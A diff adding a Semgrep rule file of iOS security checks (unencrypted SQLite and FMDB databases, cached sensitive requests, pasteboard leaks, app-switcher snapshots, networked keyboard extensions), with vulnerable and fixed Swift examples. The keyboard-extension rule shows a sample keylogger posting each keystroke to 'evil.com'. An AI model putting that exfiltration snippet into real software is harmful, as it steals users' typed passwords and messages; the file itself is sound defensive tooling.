@@ -1,0 +1,677 @@
+rules:
+  # Critical Priority 0 iOS Security Patterns
+  # Based on HackTricks and Ivan Sincek penetration testing checklists
+  # These are the highest priority patterns missing from previous rules
+
+  # ============ SQLITE DATABASE ENCRYPTION ============
+
+  - id: hacktricks-ios-sqlite-unencrypted
+    patterns:
+      - pattern-either:
+          - pattern: |
+              try Connection($PATH)
+          - pattern: |
+              let $DB = try Connection($PATH)
+          - pattern: |
+              sqlite3_open($PATH, ...)
+          - pattern: |
+              FMDB(path: $PATH)
+      - pattern-not-inside: |
+          $DB.key("...")
+      - pattern-not-inside: |
+          try $DB.key($KEY)
+    message: |
+      Unencrypted SQLite database detected (HackTricks Critical).
+      SQLite databases without encryption store data in plaintext on disk.
+
+      Example vulnerable code:
+      ```swift
+      import SQLite
+
+      let db = try Connection("path/to/database.sqlite3")
+      // No encryption - data stored in plaintext!
+      ```
+
+      Risks:
+      - Plaintext data accessible via:
+        - iTunes/Finder backup (even if encrypted)
+        - Jailbroken device file access
+        - Forensic tools (Cellebrite, GrayKey)
+        - Physical device access
+      - Sensitive data exposure (credentials, PII, financial data)
+      - Violates GDPR/CCPA requirements for data protection
+
+      Secure Fix - Use SQLCipher:
+      ```swift
+      import SQLite
+
+      // Create encrypted database
+      let db = try Connection("path/to/database.sqlite3")
+
+      // Set encryption key (use Keychain to store this key securely!)
+      let key = getEncryptionKeyFromKeychain()
+      try db.key(key)
+
+      // Alternative: Use passphrase
+      try db.key("your-secure-passphrase-from-keychain")
+
+      // Now database is encrypted with AES-256
+      ```
+
+      Secure Fix - Use Core Data with Encryption:
+      ```swift
+      let container = NSPersistentContainer(name: "Model")
+      let description = container.persistentStoreDescriptions.first
+
+      // Enable file protection
+      description?.setOption(
+          FileProtectionType.complete as NSObject,
+          forKey: NSPersistentStoreFileProtectionKey
+      )
+
+      // For sensitive data, use transformable attributes with encryption
+      ```
+
+      Best practices:
+      1. Use SQLCipher for SQLite databases
+      2. Store encryption keys in iOS Keychain (with kSecAttrAccessibleWhenUnlockedThisDeviceOnly)
+      3. Generate keys using SecRandomCopyBytes (cryptographically secure)
+      4. Enable file protection for database files
+      5. Use Core Data with encryption for simpler encryption
+      6. Never hardcode encryption keys in code
+
+      Installation (CocoaPods):
+      ```ruby
+      pod 'SQLCipher/SQLite', '~> 4.5'
+      ```
+
+      Installation (Swift Package Manager):
+      ```
+      https://github.com/stephencelis/SQLite.swift
+      ```
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-311: Missing Encryption of Sensitive Data"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: HIGH
+      source: "HackTricks"
+      priority: "P0"
+
+  - id: hacktricks-ios-fmdb-unencrypted
+    patterns:
+      - pattern-either:
+          - pattern: |
+              FMDatabase(path: $PATH)
+          - pattern: |
+              FMDatabase.databaseWithPath($PATH)
+          - pattern: |
+              $DB = FMDatabase(path: $PATH)
+      - pattern-not-inside: |
+          $DB.setKey($KEY)
+    message: |
+      FMDB database without encryption (HackTricks Critical).
+      FMDB databases store SQLite data in plaintext unless explicitly encrypted.
+
+      Secure Fix - Use FMDB with SQLCipher:
+      ```objc
+      #import <FMDB/FMDB.h>
+
+      FMDatabase *db = [FMDatabase databaseWithPath:dbPath];
+
+      if ([db open]) {
+          // Set encryption key
+          NSString *key = [self getKeyFromKeychain];
+          [db setKey:key];
+
+          // Now database is encrypted
+      }
+      ```
+
+      Swift version:
+      ```swift
+      import FMDB
+
+      let db = FMDatabase(path: dbPath)
+
+      if db.open() {
+          let key = getKeyFromKeychain()
+          db.setKey(key)
+      }
+      ```
+
+      Use CocoaPods:
+      ```ruby
+      pod 'FMDB/SQLCipher', '~> 2.7'
+      ```
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-311: Missing Encryption of Sensitive Data"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: HIGH
+      source: "HackTricks"
+      priority: "P0"
+
+  # ============ CACHE.DB SENSITIVE DATA EXPOSURE ============
+
+  - id: hacktricks-ios-cache-sensitive-requests
+    patterns:
+      - pattern-either:
+          - pattern: |
+              URLSession.shared.dataTask(with: $REQUEST)
+          - pattern: |
+              $SESSION.dataTask(with: $REQUEST)
+          - pattern: |
+              URLSession.shared.downloadTask(with: $REQUEST)
+      - pattern-not: |
+          $REQUEST.cachePolicy = .reloadIgnoringLocalCacheData
+      - pattern-not: |
+          $REQUEST.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
+      - metavariable-regex:
+          metavariable: $REQUEST
+          regex: .*(auth|login|token|credential|payment|sensitive|password|secret).*
+    message: |
+      Sensitive HTTP requests may be cached in Cache.db (HackTricks Critical).
+      URLSession caches HTTP requests/responses in Cache.db (~/Library/Caches/[bundle]/Cache.db).
+
+      Example vulnerable code:
+      ```swift
+      let url = URL(string: "https://api.example.com/user/login")!
+      var request = URLRequest(url: url)
+      request.httpMethod = "POST"
+      // No cache policy set - defaults to .useProtocolCachePolicy
+
+      URLSession.shared.dataTask(with: request) { data, response, error in
+          // Login response cached in Cache.db in PLAINTEXT
+      }
+      ```
+
+      What gets cached:
+      - HTTP request headers (may contain Authorization tokens)
+      - HTTP response data (user info, authentication tokens, PII)
+      - Stored in plaintext SQLite database
+      - Persists across app sessions
+      - Survives app deletion until iOS clears cache
+      - Accessible in backups
+
+      Cache.db location:
+      ```
+      ~/Library/Caches/[bundle-id]/Cache.db
+      ```
+
+      Extraction methods:
+      - iTunes/Finder backups
+      - Jailbroken device access
+      - Forensic tools
+
+      Secure Fix:
+      ```swift
+      let url = URL(string: "https://api.example.com/user/login")!
+      var request = URLRequest(url: url)
+      request.httpMethod = "POST"
+
+      // Disable caching for sensitive requests
+      request.cachePolicy = .reloadIgnoringLocalCacheData
+
+      // Or completely ignore all caches
+      request.cachePolicy = .reloadIgnoringLocalAndRemoteCacheData
+
+      URLSession.shared.dataTask(with: request) { data, response, error in
+          // Response not cached
+      }
+      ```
+
+      Clear cache on logout:
+      ```swift
+      func clearCacheOnLogout() {
+          // Clear all cached responses
+          URLCache.shared.removeAllCachedResponses()
+
+          // Also clear cookies
+          HTTPCookieStorage.shared.removeCookies(since: Date.distantPast)
+
+          // Clear credentials
+          URLCredentialStorage.shared.allCredentials.forEach { (protectionSpace, credentials) in
+              credentials.forEach { credential in
+                  URLCredentialStorage.shared.remove(credential.value, for: protectionSpace)
+              }
+          }
+      }
+      ```
+
+      Best practices:
+      1. Set cachePolicy for ALL sensitive requests
+      2. Disable caching for authentication/payment requests
+      3. Clear cache on logout
+      4. Use ephemeral URLSession configurations for sensitive ops:
+         ```swift
+         let config = URLSessionConfiguration.ephemeral
+         let session = URLSession(configuration: config)
+         ```
+      5. Implement custom cache policies
+      6. Regularly audit Cache.db during development
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-524: Use of Cache Containing Sensitive Information"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: HIGH
+      source: "HackTricks, Ivan Sincek"
+      priority: "P0"
+
+  - id: hacktricks-ios-missing-cache-clear-logout
+    patterns:
+      - pattern-either:
+          - pattern: |
+              func $LOGOUT(...) {
+                ...
+              }
+          - pattern: |
+              func signOut(...) {
+                ...
+              }
+      - pattern-not-inside: |
+          func $LOGOUT(...) {
+            ...
+            URLCache.shared.removeAllCachedResponses()
+            ...
+          }
+      - metavariable-regex:
+          metavariable: $LOGOUT
+          regex: .*(logout|logOut|signOut|sign_out).*
+    message: |
+      Logout function missing cache clearance (HackTricks Warning).
+      Cache.db may contain sensitive data that persists after logout.
+
+      Add to logout function:
+      ```swift
+      func logout() {
+          // Clear URL cache
+          URLCache.shared.removeAllCachedResponses()
+
+          // Clear cookies
+          HTTPCookieStorage.shared.removeCookies(since: Date.distantPast)
+
+          // Clear credentials
+          let storage = URLCredentialStorage.shared
+          storage.allCredentials.forEach { (space, creds) in
+              creds.forEach { storage.remove($0.value, for: space) }
+          }
+
+          // Clear user defaults
+          // UserDefaults.standard.removeObject(forKey: "session_token")
+
+          // Clear keychain (implement your keychain clearing logic)
+      }
+      ```
+    severity: WARNING
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-524: Use of Cache Containing Sensitive Information"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: MEDIUM
+      source: "Ivan Sincek"
+      priority: "P0"
+
+  # ============ UIPASTEBOARD SECURITY ============
+
+  - id: hacktricks-ios-pasteboard-sensitive-no-options
+    patterns:
+      - pattern-either:
+          - pattern: |
+              UIPasteboard.general.string = $DATA
+          - pattern: |
+              UIPasteboard.general.strings = $DATA
+          - pattern: |
+              $PASTEBOARD.string = $DATA
+      - metavariable-regex:
+          metavariable: $DATA
+          regex: .*(password|token|secret|key|credential|pin|otp|code|auth).*
+      - pattern-not-inside: |
+          $PASTEBOARD.setItems($ITEMS, options: [...])
+    message: |
+      Sensitive data copied to pasteboard without security options (HackTricks Critical).
+      UIPasteboard persists data across app restarts and syncs to other devices via Universal Clipboard.
+
+      Example vulnerable code:
+      ```swift
+      // User copies password/token
+      UIPasteboard.general.string = userPassword  // INSECURE!
+      ```
+
+      Risks:
+      - **Persistence**: Data survives app termination
+      - **iCloud Sync**: Copies to all user's Apple devices (iPhone, iPad, Mac)
+      - **Third-party keyboard access**: Some keyboards access pasteboard
+      - **Malicious apps**: Can read pasteboard in background (iOS 14+ limited)
+      - **Shoulder surfing**: Paste notification shows content preview
+      - **Forensics**: Pasteboard data in backups
+
+      iOS 14+ improvements:
+      - Apps notified when pasteboard accessed
+      - But data still exposed if user grants permission
+
+      Secure Fix - Use Expiring Pasteboard:
+      ```swift
+      import UIKit
+
+      func copySecurely(sensitiveData: String) {
+          let pasteboard = UIPasteboard.general
+
+          // Set item with options
+          pasteboard.setItems(
+              [[UIPasteboardOption.expirationDate.rawValue: Date().addingTimeInterval(60)]],  // Expires in 60 seconds
+              options: [
+                  UIPasteboard.OptionsKey.localOnly: true,  // Don't sync via Universal Clipboard
+                  UIPasteboard.OptionsKey.expirationDate: Date().addingTimeInterval(60)  // Auto-delete after 60s
+              ]
+          )
+
+          // Actually set the data
+          pasteboard.string = sensitiveData
+
+          // Show user a warning
+          showAlert("Copied to clipboard. Will auto-delete in 60 seconds.")
+      }
+      ```
+
+      Better - Avoid Pasteboard for Sensitive Data:
+      ```swift
+      // Instead of copy-paste for passwords:
+      // 1. Use Keychain sharing between apps (if same developer)
+      // 2. Use iOS 12+ Password AutoFill
+      // 3. Use secure deep links for app-to-app transfer
+      // 4. Implement custom secure sharing mechanism
+
+      // Example: Password AutoFill
+      func setupPasswordAutoFill() {
+          textField.textContentType = .password
+          textField.isSecureTextEntry = true
+      }
+      ```
+
+      Clear pasteboard on app background:
+      ```swift
+      func applicationDidEnterBackground(_ application: UIApplication) {
+          // Clear sensitive data from pasteboard
+          UIPasteboard.general.string = ""
+      }
+      ```
+
+      Best practices:
+      1. NEVER copy passwords, tokens, or secrets to pasteboard if avoidable
+      2. If must copy, use expiration dates (shortest possible time)
+      3. Use localOnly: true to prevent iCloud sync
+      4. Clear pasteboard when app enters background
+      5. Show user clear warnings about clipboard security
+      6. Prefer iOS Password AutoFill over manual copy-paste
+      7. Consider one-time-only pasteboard items
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-359: Exposure of Private Personal Information"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: HIGH
+      source: "HackTricks, Ivan Sincek"
+      priority: "P0"
+
+  - id: hacktricks-ios-pasteboard-persistent
+    patterns:
+      - pattern: |
+          UIPasteboard.general.string = $DATA
+      - pattern-not-inside: |
+          func applicationDidEnterBackground(...) {
+            ...
+          }
+    message: |
+      Pasteboard data persists beyond app session (HackTricks Warning).
+      UIPasteboard.general persists data even after app is closed.
+
+      Consider:
+      1. Using ephemeral pasteboard (custom UIPasteboard)
+      2. Clearing pasteboard on app background
+      3. Setting expiration dates on items
+
+      Ephemeral pasteboard example:
+      ```swift
+      // Create app-specific pasteboard (automatically cleared when app dies)
+      let privatePasteboard = UIPasteboard(name: UIPasteboard.Name("com.myapp.private"), create: true)!
+      privatePasteboard.string = sensitiveData
+
+      // This pasteboard is NOT shared with other apps
+      // Automatically cleared when app is terminated
+      ```
+    severity: WARNING
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-359: Exposure of Private Personal Information"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: MEDIUM
+      source: "HackTricks"
+      priority: "P0"
+
+  # ============ APP SNAPSHOT / APP SWITCHER SECURITY ============
+
+  - id: hacktricks-ios-snapshot-security-missing
+    patterns:
+      - pattern-either:
+          - pattern: |
+              func applicationDidEnterBackground(_ application: UIApplication) {
+                ...
+              }
+          - pattern: |
+              func applicationWillResignActive(_ application: UIApplication) {
+                ...
+              }
+      - pattern-not-inside: |
+          func applicationDidEnterBackground(...) {
+            ...
+            $VIEW.isHidden = true
+            ...
+          }
+      - pattern-not-inside: |
+          func applicationDidEnterBackground(...) {
+            ...
+            UIBlurEffect(...)
+            ...
+          }
+    message: |
+      Missing app snapshot security in background handler (HackTricks Critical).
+      iOS captures screenshot when app enters background for app switcher preview.
+
+      Example vulnerable code:
+      ```swift
+      func applicationDidEnterBackground(_ application: UIApplication) {
+          // No protection - sensitive UI captured in snapshot!
+      }
+      ```
+
+      Risk:
+      - Sensitive data visible in app switcher (double-tap home/swipe up)
+      - Screenshots stored in ~/Library/Caches/Snapshots/
+      - Accessible in backups and forensic extractions
+      - Shoulder surfing vulnerability
+
+      Secure Fix - Hide Sensitive Views:
+      ```swift
+      import UIKit
+
+      var privacyView: UIView?
+
+      func applicationWillResignActive(_ application: UIApplication) {
+          // Hide sensitive views
+          sensitiveLabel.isHidden = true
+          passwordField.isHidden = true
+          accountBalanceView.isHidden = true
+      }
+
+      func applicationDidBecomeActive(_ application: UIApplication) {
+          // Show views again
+          sensitiveLabel.isHidden = false
+          passwordField.isHidden = false
+          accountBalanceView.isHidden = false
+      }
+      ```
+
+      Secure Fix - Apply Blur Effect:
+      ```swift
+      func applicationWillResignActive(_ application: UIApplication) {
+          // Create blur effect
+          let blurEffect = UIBlurEffect(style: .light)
+          let blurView = UIVisualEffectView(effect: blurEffect)
+          blurView.frame = window!.bounds
+          blurView.tag = 999  // Tag for easy removal
+
+          window?.addSubview(blurView)
+      }
+
+      func applicationDidBecomeActive(_ application: UIApplication) {
+          // Remove blur
+          window?.viewWithTag(999)?.removeFromSuperview()
+      }
+      ```
+
+      Secure Fix - Replace with Logo:
+      ```swift
+      func applicationWillResignActive(_ application: UIApplication) {
+          // Show splash screen / logo
+          let splashView = UIImageView(image: UIImage(named: "logo"))
+          splashView.frame = window!.bounds
+          splashView.contentMode = .scaleAspectFit
+          splashView.backgroundColor = .white
+          splashView.tag = 999
+
+          window?.addSubview(splashView)
+      }
+
+      func applicationDidBecomeActive(_ application: UIApplication) {
+          window?.viewWithTag(999)?.removeFromSuperview()
+      }
+      ```
+
+      Best practices:
+      1. Always protect sensitive UI in background transition
+      2. Use blur effect for moderate sensitivity
+      3. Use logo/splash screen for high sensitivity (banking, health apps)
+      4. Test app switcher preview during development
+      5. Clear sensitive TextFields before backgrounding
+      6. Hide account balances, PII, medical data
+      7. Consider security-sensitive scenes (login, payment, profile)
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-922: Insecure Storage of Sensitive Information"
+      owasp-mobile-2024: "M9: Insecure Data Storage"
+      confidence: MEDIUM
+      source: "HackTricks, Ivan Sincek"
+      priority: "P1"
+
+  # ============ APP EXTENSIONS SECURITY ============
+
+  - id: hacktricks-ios-keyboard-extension-network
+    patterns:
+      - pattern-either:
+          - pattern: |
+              class $NAME: UIInputViewController {
+                ...
+                URLSession.$METHOD(...)
+                ...
+              }
+          - pattern: |
+              class $NAME: UIInputViewController {
+                ...
+                $SESSION.dataTask(...)
+                ...
+              }
+    message: |
+      Keyboard extension accessing network (HackTricks Critical Privacy Violation).
+      Keyboard extensions that access the network can exfiltrate user keystrokes.
+
+      Example violation:
+      ```swift
+      import UIKit
+
+      class KeyboardViewController: UIInputViewController {
+          func keyPressed(_ key: String) {
+              // DANGEROUS: Sending keystrokes to server
+              let url = URL(string: "https://evil.com/log")!
+              var request = URLRequest(url: url)
+              request.httpMethod = "POST"
+              request.httpBody = key.data(using: .utf8)
+
+              URLSession.shared.dataTask(with: request).resume()
+          }
+      }
+      ```
+
+      Why this is CRITICAL:
+      - Captures ALL user typing (passwords, credit cards, messages, emails)
+      - Violates user privacy expectations
+      - Violates App Store Review Guidelines
+      - May be malware/spyware
+
+      App Store Guidelines:
+      > Keyboard extensions must not access the network, or they will be rejected.
+
+      Exceptions (requires RequestsOpenAccess = YES):
+      - Must explicitly request "Full Access" from user
+      - User must explicitly grant permission
+      - Should only be used for legitimate features (e.g., GIF search)
+
+      Secure keyboard extension:
+      ```swift
+      class KeyboardViewController: UIInputViewController {
+          // NO network access
+          // NO URLSession
+          // Process everything locally
+
+          func keyPressed(_ key: String) {
+              // Local processing only
+              textDocumentProxy.insertText(key)
+          }
+      }
+      ```
+
+      Info.plist for open access (if needed):
+      ```xml
+      <key>NSExtension</key>
+      <dict>
+          <key>RequestsOpenAccess</key>
+          <true/>  <!-- User MUST approve -->
+      </dict>
+      ```
+
+      This will be REJECTED by App Store unless clearly justified!
+    severity: ERROR
+    languages:
+      - swift
+      - objc
+    metadata:
+      category: security
+      cwe: "CWE-359: Exposure of Private Personal Information"
+      owasp-mobile-2024: "M6: Inadequate Privacy Controls"
+      confidence: HIGH
+      source: "Ivan Sincek"
+      priority: "P1"
